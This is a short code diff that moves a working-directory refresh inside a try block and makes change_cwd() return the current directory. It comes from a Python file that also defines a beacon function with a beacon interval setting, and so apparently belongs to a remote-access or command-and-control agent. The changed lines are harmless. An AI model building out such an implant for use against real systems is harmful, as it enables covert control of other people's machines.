@@ -222,11 +222,12 @@ def get_cwd():
 def change_cwd(path):
     try:
         chdir(path)
+        get_cwd()
     except Exception as e:
         if VERBOSE:
             print(e)
             print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
-    get_cwd()
+    return CURRENT_WORKING_DIR
 
 def beacon(conn, data):
     global BEACON_INTERVAL_SETTING
